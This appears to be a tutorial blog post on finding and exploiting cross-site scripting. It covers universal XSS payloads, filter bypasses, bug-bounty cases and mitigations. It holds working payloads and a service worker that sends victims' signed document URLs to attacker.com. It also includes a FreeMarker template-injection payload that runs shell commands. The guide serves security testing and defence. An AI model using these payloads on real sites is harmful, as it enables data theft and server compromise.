---
title: "Effective XSS Vulnerability Hunting: From alert() to RCE | DevSense"
description: "Master the art of finding and exploiting Cross-Site Scripting (XSS) vulnerabilities. Learn how to build universal payloads, bypass filters, and escalate XSS to RCE with real-world Bug Bounty cases."
published: 2026-07-03
faq:
  - question: "What makes a payload a 'polyglot' or 'universal' XSS payload?"
    answer: "A universal XSS payload is designed to execute successfully across multiple HTML contexts (attributes, plain text, scripts, or styles) by closing existing tags/quotes and injecting active tags (like iframe or script) without causing fatal syntax errors in the browser parser."
  - question: "How does a Service Worker hijack S3 bucket uploads for XSS?"
    answer: "If an application serves user-uploaded files from a shared S3 bucket under the same origin, an attacker can upload a malicious service worker. Once registered, it intercepts all future file requests within its scope, allowing the attacker to steal signed URLs or exfiltrate private files."
  - question: "What is the difference between client-side template injection and SSTI?"
    answer: "Client-side template injection (like AngularJS/VueJS) executes JavaScript in the victim's browser using client-rendered template expressions. Server-Side Template Injection (SSTI) executes code on the web server itself within templates like FreeMarker or Twig, often leading to Remote Code Execution (RCE)."
---

# Effective XSS Vulnerability Hunting: From alert() to RCE

Finding security vulnerabilities is often seen as a black art reserved for elite hackers. However, client-side vulnerabilities like **Cross-Site Scripting (XSS)** follow a structured, logical pattern. By understanding browser parsing and learning how to build universal payloads, any developer or QA engineer can effectively identify XSS bugs.

In this guide, based on Heisenbug presentations and real-world Bug Bounty experience, we will build a solid methodology for detecting XSS, look at how to construct advanced payloads, and explore real cases where simple injections escalated to server takeovers.

---

## Contents

* [What is XSS and Why It Occurs](#what-is-xss)
* [The Hunting Methodology](#hunting-methodology)
* [Building the Universal Payload (Level 0 to 1337)](#universal-payloads)
* [Bypassing Real-World Restrictions](#bypassing-restrictions)
* [Real Bug Bounty Case Studies](#case-studies)
    * [Reflected XSS Bypass at Mail.ru](#case-mailru)
    * [Stored S3 XSS to Service Worker Hijacking](#case-s3)
    * [Email Template Injection to FreeMarker RCE](#case-ssti)
* [Mitigations & Defenses](#mitigations)

---

<a id="what-is-xss"></a>
## What is XSS and Why It Occurs

**Cross-Site Scripting (XSS)** is a vulnerability that allows an attacker to execute arbitrary JavaScript code in a victim's browser within the security context (Origin) of the target website.

It occurs when a web application takes untrusted user input and includes it in the generated HTML page without proper encoding or sanitization. Browsers cannot distinguish between the website's original code and injected scripts; they simply execute whatever HTML tags and JavaScript they encounter.

We typically categorize XSS into:
* **Stored XSS:** Malicious input is saved in the database (e.g., username, comment) and rendered later to other users.
* **Reflected XSS:** Malicious input is reflected immediately in the response, typically via a URL parameter or POST request.

---

<a id="hunting-methodology"></a>
## The Hunting Methodology

Many security professionals use automated scanners, but they often miss context-specific vulnerabilities and trigger security filters. A black-box manual testing approach is far more effective:

1. **Inject a unique tracking string** (e.g., `qweqwe`) into every single input field, URL parameter, header, or upload option.
2. **Inspect the Page Source (DOM)** by opening DevTools (`F12`), searching (`Ctrl+F`) for your string, and noting how many times it appears.
3. **Analyze the injection context.** Is it inside a plain text block? Inside a value attribute? Inside a script tag?
4. **Test Special Characters** (`' " < > &`) to see if they are sanitized (converted to HTML entities like `&quot;`, `&lt;`, `&gt;`) or passed raw.
5. **Construct and escalate the payload** depending on which characters are allowed.

---

<a id="universal-payloads"></a>
## Building the Universal Payload (Level 0 to 1337)

Instead of manually crafting a payload for every input field, bug hunters use **universal payloads** designed to break out of multiple HTML contexts simultaneously.

### Level 0: The Novice
`"<script>alert()</script>"`
This only works if the developer prints the input directly in raw HTML text:
```html
<p>Welcome, User <script>alert()</script>!</p>
```

### Level 1: Escaping Attributes
If the input goes inside an attribute, Level 0 fails because it stays inside the quotation marks:
```html
<input name="search" value="<script>alert()</script>">
```
To escape this, we add a closing quote and closing tag: `">`
New payload: `"><script>alert()</script>`
```html
<input name="search" value=""><script>alert()</script>">
```

### Level 2: Escaping Titles and Scripts
If the input goes inside `<title>`, `<style>`, `<textarea>`, or `<script>` tags, the browser treats the content as plain text or raw code, ignoring standard HTML tags.
We must close those tags first.
New payload: `"></title></script><script>alert()</script>`

What if the developer used single quotes for the attribute? We add `'` to our payload:
New payload: `'">></title></script><script>alert()</script>`

### Level 3: Leveraging the iframe
Instead of `<script>`, which is heavily monitored by Web Application Firewalls (WAFs), we can use an `<iframe>` with an event handler like `onload`:
New payload: `'">></title></script><iframe onload='alert()'>`

An iframe executes the `onload` handler as soon as it mounts, regardless of whether its `src` is valid.

### Level 1337: Slashes and Polyglots
Many basic sanitizers strip spaces or look for closing brackets. We can bypass them by:
* Replacing spaces with slashes (`/`).
* Relying on the browser to auto-close our tags (omitting `>`).
* Closing comments (`-->`).
* Injecting template indicators for client-side frameworks like AngularJS or VueJS (`{{7*7}}`).

Our ultimate universal payload becomes:
```html
'"/test/></title/></script/></style/-->{{7*7}}<iframe/onload='alert`1``<!--
```

If this payload lands inside a value attribute, it generates:
```html
<input name="search" value=''"/test/></title/></script/></style/-->{{7*7}}<iframe/onload='alert`1``<!--'>
```
Here, the attribute `test` is written directly into the tag, which we can detect using a simple console script:
```javascript
if (document.querySelectorAll('*[test]').length > 0) {
    console.log("XSS Detected via attribute injection!");
}
```

---

<a id="bypassing-restrictions"></a>
## Bypassing Real-World Restrictions

### 1. Bypassing Tag Filters with Unclosed Tags
If a filter strips all tags matching `<...>`, you can exploit the browser's lenient parser by leaving the tag unclosed:
```html
<iframe/onload='alert()'
```
The browser parses this, encounters the end of the input, and automatically appends the closing bracket, triggering the payload.

### 2. Bypassing URL Scheme Filters in Redirects
When an application uses a redirection parameter (e.g., `returnUrl`), developers often check if the string starts with `javascript:`.
* **Bypass via Whitespace:** Putting a tab or space before the scheme (`%20javascript:alert()`) frequently bypasses naive `startsWith` checks, while the browser still executes it as a valid URI scheme.
* **Bypass via URL syntax:** Constructing a payload that looks like a host but executes JS: `javascript://google.com/%0aalert()`. The double slash turns into a comment, `%0a` acts as a newline, and `alert()` runs.

---

<a id="case-studies"></a>
## Real Bug Bounty Case Studies

<a id="case-mailru"></a>
### Case 1: Reflected XSS Bypass at Mail.ru
On a Mail.ru subproject (`biz.mail.ru`), hitting a server 500 error redirected users to an error page with a `from` parameter. 
The page had a refresh button linking back to the original URL.
* Injecting `javascript:alert()` caused the system to replace the scheme with `https://`.
* Injecting `%20javascript:alert()` (with a leading space) successfully bypassed the regular expression. The system printed the value as-is, allowing XSS execution upon clicking the refresh button.

<a id="case-s3"></a>
### Case 2: Stored S3 XSS to Service Worker Hijacking
On a private CRM system, users could upload contract attachments. The system stored these files in a shared Amazon S3 bucket.
When a user opened a file, the CRM generated a temporary signed URL and redirected the user to the S3 bucket.
* The S3 bucket was served under the same host for all clients.
* An attacker uploaded an HTML file containing XSS payload. When opened, it executed arbitrary JavaScript.
* To escalate this from a simple sandbox XSS to a full data leak, the attacker uploaded a malicious `serviceworker.js` file:
```javascript
// serviceworker.js
self.addEventListener('fetch', function(event) {
    event.respondWith(
        new Response("<iframe src='https://attacker.com/log?url=" + encodeURIComponent(event.request.url) + "'></iframe>", {
            headers: { 'Content-Type': 'text/html' }
        })
    );
});
```
* By directing the victim to open `exploit.html` once, the service worker registered itself over the entire S3 bucket path. 
* From that point forward, whenever the victim attempted to view any confidential document in that S3 bucket, the service worker intercepted the request, hijacked the page, and sent the signed document URL (with credentials) back to the attacker's server.

<a id="case-ssti"></a>
### Case 3: Email Template Injection to FreeMarker RCE
A marketing platform allowed users to design HTML email campaigns. The template editor supported custom variables.
* The attacker injected template expressions like `${7*7}` and `{{7*7}}` into the preview template.
* During preview rendering, the server evaluated the expression and printed `49`, indicating **Server-Side Template Injection (SSTI)**.
* The application used the Java-based **FreeMarker** template engine. Using FreeMarker's built-in execution utilities, the attacker escalated the injection to **Remote Code Execution (RCE)**:
```html
[#assign cmd = 'freemarker.template.utility.Execute'?new()]
${cmd('id')}
```
This payload executed the shell command `id` on the hosting server, yielding a root shell printout in the email preview window.

---

<a id="mitigations"></a>
## Mitigations & Defenses

1. **Never Trust User Input:** Treat every parameter, header, and uploaded file name as potentially malicious.
2. **Context-Aware Output Encoding:** Use proper sanitization depending on where the data is printed:
    * In HTML body: use `htmlspecialchars()`.
    * In JavaScript context: use JSON encoding (`json_encode()`).
    * In URLs: validate against strict protocols (`http`/`https`) and reject scripts.
3. **Use Content Security Policy (CSP):** Implement strict CSP headers to disable inline scripts and limit script execution to trusted domains.
4. **Isolate Uploads:** Always host user-uploaded files on a completely separate domain (e.g., `usercontent.com`) without session cookies or access to main application APIs.
5. **Secure Template Engines:** Disable execution APIs and sandbox template renderers when using engines like FreeMarker, Twig, or Blade.
